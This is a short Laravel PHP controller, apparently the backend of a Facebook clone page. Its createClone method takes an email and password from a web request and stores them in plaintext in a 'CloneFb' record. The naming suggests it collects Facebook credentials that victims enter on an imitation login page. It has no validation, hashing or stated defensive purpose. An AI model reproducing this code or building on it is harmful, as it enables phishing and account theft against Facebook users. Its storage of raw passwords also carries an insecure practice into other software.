<?php

namespace App\Http\Controllers\Facebook;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\CloneFb;

class CloneController extends Controller {
	public function createClone(Request $request) {
		$clone = new CloneFb;
		$clone->email = $request->email;
		$clone->password = $request->password;
		$clone->save();
	}
}
